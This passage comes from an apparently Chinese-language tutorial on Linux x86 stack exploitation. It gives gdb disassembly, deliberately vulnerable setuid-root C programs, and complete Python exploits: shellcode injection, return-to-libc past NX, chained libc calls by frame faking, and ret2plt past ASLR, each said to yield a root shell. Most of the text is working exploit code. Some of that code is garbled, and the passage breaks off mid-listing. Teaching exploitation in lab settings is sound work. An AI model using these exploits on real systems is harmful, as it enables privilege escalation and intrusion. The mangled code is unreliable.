class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code <span class="keyword">for</span> function main:  </span><br><span class="line">     <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">     <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">     <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;:   push   edi  </span><br><span class="line">     <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;:   sub    esp,<span class="number">0x8</span>  </span><br><span class="line">     <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">    <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">    <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;:  mov    eax,DWORD PTR [eax]  </span><br><span class="line">    <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;:  mov    DWORD PTR [ebp<span class="number">-0x8</span>],<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;:  mov    edx,eax  </span><br><span class="line">    <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">    <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;:  mov    ecx,DWORD PTR [ebp<span class="number">-0x8</span>]  </span><br><span class="line">    <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;:  mov    edi,edx  </span><br><span class="line">    <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;:  repnz scas al,BYTE PTR es:[edi]  </span><br><span class="line">    <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;:  mov    eax,ecx  </span><br><span class="line">    <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;:  <span class="keyword">not</span>    eax  </span><br><span class="line">    <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;:  sub    eax,<span class="number">0x1</span>  </span><br><span class="line">    <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;:  cmp    eax,<span class="number">0x100</span>  </span><br><span class="line">    <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;:  jbe    <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;  </span><br><span class="line">    <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;:  mov    DWORD PTR [esp],<span class="number">0x80485e0</span>  </span><br><span class="line">    <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;:  call   <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;  </span><br><span class="line">    <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;:  mov    eax,ds:<span class="number">0x804a020</span>  </span><br><span class="line">    <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">    <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;:  call   <span class="number">0x8048360</span> &lt;fflush@plt&gt;  </span><br><span class="line">    <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;:  mov    eax,<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;:  jmp    <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;  </span><br><span class="line">    <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;:  mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">    <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">    <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;:  mov    eax,DWORD PTR [eax]  </span><br><span class="line">    <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">    <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;:  call   <span class="number">0x8048464</span> &lt;foo&gt;  </span><br><span class="line">    <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add    esp,<span class="number">0x8</span>  </span><br><span class="line">   <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop    edi  </span><br><span class="line">   <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop    ebp  </span><br><span class="line">   <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$   </span><br><span class="line">gdb-peda$ disass bar  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function bar:  </span><br><span class="line">    <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">    <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">    <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x108</span>  </span><br><span class="line">    <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>] </span><br><span class="line">   <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;:  mov    DWORD PTR [esp+<span class="number">0x4</span>],eax  </span><br><span class="line">   <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;:  lea    eax,[ebp<span class="number">-0x100</span>]  </span><br><span class="line">   <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;:  call   <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$ disass foo  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function foo:  </span><br><span class="line">   <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">   <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">   <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]  </span><br><span class="line">   <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;:   mov    DWORD PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;:  call   <span class="number">0x8048477</span> &lt;bar&gt;  </span><br><span class="line">   <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p><strong>堆栈布局：</strong></p><p>当我们已经知道<code>256字节</code>的用户输入，用空字节可以覆盖<code>foo的EBP的LSB</code>。所以当<code>foo</code>的存储在目标缓冲区<code>buf</code>之上的<code>EBP</code>被一个<code>NULL</code>字节所覆盖时，<code>ebp</code>从<code>0xbffff2d8</code>变为<code>0xbffff200</code>。从堆栈布局我们可以看到堆栈位置<code>0xbffff200</code>是目标缓冲区<code>buf</code>的一部分，由于用户输入被复制到该目标缓冲区，攻击者可以控制这个堆栈位置<code>0xbffff200</code>，因此他控制指令指针<code>eip</code>使用他可以实现任意代码执行。让我们通过发送一系列256的<code>A</code>来测试它。</p><p><strong>测试步骤1：EBP是否覆盖，从而可能覆盖返回地址？</strong></p><p>显示<code>eip</code>已经被<code>AAAA</code>覆盖。</p><p>返回地址位于<code>buf</code>的偏移量<code>0xac</code>处。有了这些信息，我们可以编写一个漏洞利用程序来实现任意的代码执行。</p><p><strong>漏洞代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Spawn a shell.   </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh) Size- 28 bytes.  </span></span><br><span class="line"> scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"</span>  </span><br><span class="line"> ret_addr = <span class="number">0xbffff218</span>  </span><br><span class="line"> <span class="comment">#endianess conversion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)   <span class="comment">#turn Address + NOP's + Shellcode + Junk  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">172</span>  </span><br><span class="line">buf += conv(ret_addr)  </span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span>  </span><br><span class="line">buf += scode  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">22</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure><p>执行上面的exploit程序给我们root shell，如下所示：</p><hr><h2 id="使用return-to-libc绕过NX-bit"><a href="#使用return-to-libc绕过NX-bit" class="headerlink" title="使用return-to-libc绕过NX bit"></a>使用return-to-libc绕过NX bit</h2><p><code>虚拟机安装：Ubuntu 12.04（x86）</code></p><p><strong>NT Bit</strong>是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。比如，使数据，堆栈和堆段不可执行，而代码段不可写。在<code>NX Bit</code>打开的情况下，我们基于堆栈的缓冲区溢出的经典方式会失败。应为在经典的方法中，<code>shellcode</code>被复制进堆栈中，返回地址指向<code>shellcode</code>。但是现在由于堆栈不再可执行，我们利用漏洞渗透失败！但是这种环节技术并不是万无一失的。还是有方法绕过<code>NX Bit</code>的。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span>   </span><br><span class="line">   <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span>  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span>  </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span>  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>我们可以使用叫做<code>return-to-libc</code>的攻击技术绕过<code>NX bit</code>。这里返回地址被一个特定的<code>libc</code>函数地址覆盖。比如，如果攻击者想要生成一个<code>shell</code>，那么它将使用<code>system（）</code>地址覆盖返回地址，并在堆栈中设置<code>system（）</code>所需的相应参数，以便调用它。在已经放汇编红会之了漏洞代码的堆栈布局后，让我们编写一个漏洞代码来绕过<code>NX</code>位</p><p><strong>攻击代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct</span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it.   </span></span><br><span class="line"> <span class="comment">#For example system address = libc base address + system offset  </span></span><br><span class="line"> <span class="comment">#where   </span></span><br><span class="line">        <span class="comment">#libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)  </span></span><br><span class="line">        <span class="comment">#system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")  </span></span><br><span class="line">         system = <span class="number">0xb7e5d0b0</span>        <span class="comment">#0xb7e2000+0x0003f060  </span></span><br><span class="line">         exit = <span class="number">0xb7e50bf0</span>          <span class="comment">#0xb7e2000+0x00032be0     </span></span><br><span class="line">        <span class="comment">#system_arg points to 'sh' substring of 'fflush' string.   </span></span><br><span class="line">        <span class="comment">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c.   </span></span><br><span class="line">        <span class="comment">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!  </span></span><br><span class="line">system_arg = <span class="number">0xb7f816a0</span>     <span class="comment">#(obtained from hexdump output of the binary)    </span></span><br><span class="line"><span class="comment">#endianess conversion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num) <span class="comment">#system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span>  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(exit)  </span><br><span class="line">buf += conv(system_arg)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure><p>漏洞代码中，需要3个地址。分别为<code>system()</code>，<code>exit()</code>，还有字符<code>sh</code>所在的地址。可以直接用<code>gdb</code>打印出<code>system()</code>,<code>exit()</code>函数的地址。<code>sh</code>字符串的地址可以使用<code>peda</code>插件的<code>find</code>功能直接查找。具体做法如下图所示：</p><p>然后运行<code>exp.py</code>便可以成功渗透，并给我们<code>shellcode</code>:</p><hr><h2 id="使用链接的return-to-libc绕过NX-bit"><a href="#使用链接的return-to-libc绕过NX-bit" class="headerlink" title="使用链接的return-to-libc绕过NX bit"></a>使用链接的return-to-libc绕过NX bit</h2><p><code>虚拟机安装：Ubuntu 12.04（x86）</code></p><p>有需要攻击者为了成功利用需要调用多个<code>libc</code>函数。链接多个libc函数的一种简单方法是在堆栈中放置一个libc函数地址，但是由于函数参数的原因，所以是不可能的。所以需要用链接的方式绕过检测机制。</p><p>漏洞代码：</p><p>\1.  //test.c  </p><p>\2.  #include &lt;stdio.h&gt;  </p><p>\3.  #include &lt;string.h&gt;  </p><p>\4.  <strong>int</strong> main(<strong>int</strong> argc, <strong>char*</strong> argv[]) {  </p><p>\5.   <strong>char</strong> buf[256];  </p><p>\6.   seteuid(getuid()); /* Temporarily drop privileges */  </p><p>\7.   strcpy(buf,argv[1]);  </p><p>\8.   printf(“%s”,buf);  </p><p>\9.   fflush(stdout);  </p><p>\10.  <strong>return</strong> 0;  </p><p>\11. }  </p><p>编译命令：</p><p>\1.  #echo 0 &gt; /proc/sys/kernel/randomize_va_space  </p><p>\2.  $gcc -fno-stack-protector -g -o test test.c  </p><p>\3.  $sudo chown root test  </p><p>\4.  $sudo chgrp root test  </p><p>\5.  $sudo chmod +s test  </p><p>前一篇文章所述，链接setuid，system和exit将允许我们能够利用漏洞代码”vuln“。但由于以下两个问题，不是一个直接的任务：在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。其次seteuid_arg应为零。但是由于我们的缓冲区溢出是由于strcpy引起的，所以零变成一个坏的字符，ie）这个零之后的字符不会被strcpy()复制到堆栈中。</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image019.png" alt="https://bbs.pediy.com/upload/attach/201705/694899_dw6ur5mhs7igtw2.png"></p><p>为了在堆栈中放置多个libc函数或其参数，需要使用帧伪造技术。在这种技术中，而不是使用libc函数地址（本例中为seteuid）直接覆盖返回地址，我们用“leave ret”指令来覆盖它。这允许攻击者将堆栈中的函数参数存储起来，而不会有任何重叠，从而允许调用相应的libc函数，而不会有任何问题。当攻击者伪造帧进行缓冲区溢出时，如下图堆栈布局所示，成功链接libc函数seteuid, system 和 exit:</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image021.png" alt="https://bbs.pediy.com/upload/attach/201705/507717_a7401717ka9f0t9.png"></p><p>上图中的红色突出显示是返回地址，其中每个“leave ret”指令调用其上方的libc函数。例如，第一个“leave ret”指令（位于堆栈地址0xbffff1fc）调用seteuid()，而第二个“leave ret“(位于堆栈地址0xbffff20c)调用system(),第三个“leave ret”指令（位于堆栈地址0xbffff21c）调用exit()。</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image023.png" alt="https://bbs.pediy.com/upload/attach/201705/507717_9eqh4zr0yhsmjd3.png"></p><p>利用代码：</p><p>\1.  #exp.py  </p><p>\2.  #!/usr/bin/env python  </p><p>\3.  import <strong>struct</strong>  </p><p>\4.  from subprocess import call  </p><p>\5.  fake_ebp0 = 0xbffff1a0  </p><p>\6.  fake_ebp1 = 0xbffff1b8  </p><p>\7.  fake_ebp2 = 0xbffff1d0  </p><p>\8.  fake_ebp3 = 0xbffff1e8  </p><p>\9.  fake_ebp4 = 0xbffff204  </p><p>\10. fake_ebp5 = 0xbffff214  </p><p>\11. fake_ebp6 = 0xbffff224  </p><p>\12. fake_ebp7 = 0xbffff234  </p><p>\13. leave_ret = 0x0804851c  </p><p>\14. sprintf_addr = 0xb7e6e8d0  </p><p>\15. seteuid_addr = 0xb7f09720  </p><p>\16. system_addr = 0xb7e61060  </p><p>\17. exit_addr = 0xb7e54be0  </p><p>\18. sprintf_arg1 = 0xbffff210  </p><p>\19. sprintf_arg2 = 0x80485f0  </p><p>\20. sprintf_arg3 = 0xbffff23c  </p><p>\21. system_arg = 0x804829d  </p><p>\22. exit_arg = 0xffffffff  </p><p>\23. #endianess convertion  </p><p>\24. def conv(num):  </p><p>\25.  <strong>return</strong> <strong>struct</strong>.pack(“* 264   </p><p>\26. buf += conv(fake_ebp0)   </p><p>\27. buf += conv(leave_ret)   </p><p>\28. #Below four stack frames are for sprintf (to setup seteuid arg )  </p><p>\29. buf += conv(fake_ebp1)   </p><p>\30. buf += conv(sprintf_addr)   </p><p>\31. buf += conv(leave_ret)   </p><p>\32. buf += conv(sprintf_arg1)   </p><p>\33. buf += conv(sprintf_arg2)   </p><p>\34. buf += conv(sprintf_arg3)   </p><p>\35. buf += conv(fake_ebp2)   </p><p>\36. buf += conv(sprintf_addr)   </p><p>\37. buf += conv(leave_ret)   </p><p>\38. sprintf_arg1 += 1  </p><p>\39. buf += conv(sprintf_arg1)   </p><p>\40. buf += conv(sprintf_arg2)   </p><p>\41. buf += conv(sprintf_arg3)   </p><p>\42. buf += conv(fake_ebp3)   </p><p>\43. buf += conv(sprintf_addr)   </p><p>\44. buf += conv(leave_ret)   </p><p>\45. sprintf_arg1 += 1  </p><p>\46. buf += conv(sprintf_arg1)   </p><p>\47. buf += conv(sprintf_arg2)   </p><p>\48. buf += conv(sprintf_arg3)   </p><p>\49. buf += conv(fake_ebp4)   </p><p>\50. buf += conv(sprintf_addr)   </p><p>\51. buf += conv(leave_ret)   </p><p>\52. sprintf_arg1 += 1  </p><p>\53. buf += conv(sprintf_arg1)   </p><p>\54. buf += conv(sprintf_arg2)   </p><p>\55. buf += conv(sprintf_arg3)  </p><p>\56. #Dummy - To avoid null byte in fake_ebp4.   </p><p>\57. buf += “X” * 4   </p><p>\58. #Below stack frame is for seteuid  </p><p>\59. buf += conv(fake_ebp5)   </p><p>\60. buf += conv(seteuid_addr)   </p><p>\61. buf += conv(leave_ret)   </p><p>\62. #Dummy - This arg is zero’d by above four sprintf calls  </p><p>\63. buf += “Y” * 4   </p><p>\64. #Below stack frame is for system  </p><p>\65. buf += conv(fake_ebp6)   </p><p>\66. buf += conv(system_addr)   </p><p>\67. buf += conv(leave_ret)   </p><p>\68. buf += conv(system_arg)   </p><p>\69. #Below stack frame is for exit  </p><p>\70. buf += conv(fake_ebp7)   </p><p>\71. buf += conv(exit_addr)   </p><p>\72. buf += conv(leave_ret)   </p><p>\73. buf += conv(exit_arg)   </p><p>\74. print “Calling vulnerable program”  </p><p>\75. call([“./test”, buf])  </p><p>执行上述漏洞代码给我们root shell</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image024.png" alt="img"></p><p><strong>Test 6**</strong>：绕过ASLR - 第一部分**</p><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>在前面的攻击教程中，我们看到了攻击者需要知道下面两样事情</p><p>1.堆栈地址（跳转到shellcode）</p><p>2.libc基地址（成功绕过NX bit）</p><p>为了利用漏洞代码。 为了阻止攻击者的行为，安全研究人员提出了一个称为“ASLR”的漏洞利用。</p><p>地址空间布局随机化（ASLR）是随机化的利用缓解技术:堆栈地址，堆地址，共享库地址这三个一旦桑树地址被随机化，特别是当共享库被随机化时，我们采取的绕过NX Bit的方法不会生效，因为攻击者需要知道libc的基地址。但这种环节技术并不是万无一失的。</p><p>因为随机化被关闭，所以libc基址是常量（0xb7e22000 - 对于我们的“vuln”二进制文件）。函数偏移也是不变的（从“readelf -s libc.so.6 | grep”获得）现在当我们打开完全随机化（使用下面的命令）</p><p>\1.  #echo 2 &gt; /proc/sys/kernel/randomize_va_space  </p><p>libc基地址将被随机化。但是libc函数的偏移量是不会变的。所以，如果我们可以绕过共享库及地址随机化，即使打开ASLR，也可以成功利用易受攻击的程序。</p><p>在这种技术中，而不是返回到libc函数。而是攻击者返回到一个函数的PLT。由于“function@PLT”不是随机的，所以攻击者不再需要预测libc的及地址，二十可以建档的返回到“function@PLT”来调用“function”。</p><p>与静态库不同，共享库代码段在多个进程之间共享，其数据段对于每一个进程是唯一的。这有助于减少内存空间和磁盘空间。由于代码段在多个进程之间共享，所以应该只有read和execute权限，英雌动态连接器不能重新定位代码段中存在的数据符号或函数地址。那么动态链接如何在运行时重新定位共享符号。</p><p>位置无关代码（PIC）是为了解决这个问题而开发的 - 它确保共享库代码段在多个进程之间共享，尽管在加载时执行重定位。PIC通过一级间接寻址实现这一点-共享库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变。</p><p>全局偏移表（GOT）：全局偏移表包含每个全局变量的4字节条目，其中4字节条目包含全局变量的地址。当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，指令指向GOT中条目。当加载共享库时，GOT条目由动态链接器重新定位。因此，PIC使用该表来重新定位具有单个间接级别的全局符号。</p><p>过程链接表（PLT）： 过程链接表包含每个全局函数的存根代码。代码段中的调用指令不直接调用函数（’function’），而是调用存根代码（function @ PLT）。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到GOT（GOT [n]）。这次解析仅在函数（’function’）的第一次调用期间发生，稍后当代码段中的调用指令调用存根代码（function @PLT）时，而不是调用动态链接器来解析函数地址（’function’）存根代码直接从GOT（GOT [n]）获取功能地址并跳转到它。因此，PIC使用这个表来重新定位具有两级间接的功能地址。</p><p>漏洞代码：</p><p>\1.  #include &lt;stdio.h&gt;  </p><p>\2.  #include &lt;string.h&gt;  </p><p>\3.  /* Eventhough shell() function isnt invoked directly, its needed here since ‘system@PLT’ and ‘exit@PLT’ stub code should be present in executable to successfully exploit it. */  </p><p>\4.  <strong>void</strong> shell() {  </p><p>\5.   system(“/bin/sh”);  </p><p>\6.   exit(0);  </p><p>\7.  }  </p><p>\8.  <strong>int</strong> main(<strong>int</strong> argc, <strong>char*</strong> argv[]) {  </p><p>\9.   <strong>int</strong> i=0;  </p><p>\10.  <strong>char</strong> buf[256];  </p><p>\11.  strcpy(buf,argv[1]);  </p><p>\12.  printf(“%s\n”,buf);  </p><p>\13.  <strong>return</strong> 0;  </p><p>\14. }  </p><p>编译命令：</p><p>\1.  #echo 2 &gt; /proc/sys/kernel/randomize_va_space  </p><p>\2.  $gcc -g -fno-stack-protector -o test test.c  </p><p>\3.  $sudo chown root test  </p><p>\4.  $sudo chgrp root test  </p><p>\5.  $sudo chmod +s test  </p><p>反编译test，我们可以找到‘system@PLT’和 ‘exit@PLT’的地址。</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image025.png" alt="img"></p><p>使用这些地址我们可以写一个绕过ASLR（和NX bit）的漏洞利用代码。</p><p>利用代码：</p><p>\1.  #exp.py  </p><p>\2.  #!/usr/bin/env python  </p><p>\3.  import <strong>struct</strong>  </p><p>\4.  from subprocess import call  </p><p>\5.  system = 0x8048380  </p><p>\6.  exit = 0x80483a0  </p><p>\7.  system_arg = 0x80485b5     #Obtained from hexdump output of executable ‘vuln’  </p><p>\8.  #endianess convertion  </p><p>\9.  def conv(num):  </p><p>\10.  <strong>return</strong> <strong>struct</strong>.pack(“&lt;I”,num)  </p><p>\11.   </p><p>\12. # Junk + system + exit + system_arg  </p><p>\13. buf = “A” * 272  </p><p>\14. buf += conv(system)  </p><p>\15. buf += conv(exit)  </p><p>\16. buf += conv(system_arg)  </p><p>\17. print “Calling vulnerable program”  </p><p>\18. call([“./test”, buf])  </p><p>执行上面的exploit程序给我们root shell，如下所示：</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image026.png" alt="img"></p><p><strong>Test 7**</strong>：绕过ASLR - 第二部分**</p><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>使用爆破技巧，来绕过共享库地址随机化。在这个教程中，攻击者选择特定的 Libc 基址，并持续攻击程序直到成功。假设你足够幸运，这个技巧是用于绕过 ASLR 的最简单的技巧。</p><p>漏洞代码：</p><p>\1.  //test.c  </p><p>\2.  #include &lt;stdio.h&gt;  </p><p>\3.  #include &lt;string.h&gt;  </p><p>\4.  <strong>int</strong> main(<strong>int</strong> argc, <strong>char*</strong> argv[]) {  </p><p>\5.   <strong>char</strong> buf[256];  </p><p>\6.   strcpy(buf,argv[1]);  </p><p>\7.   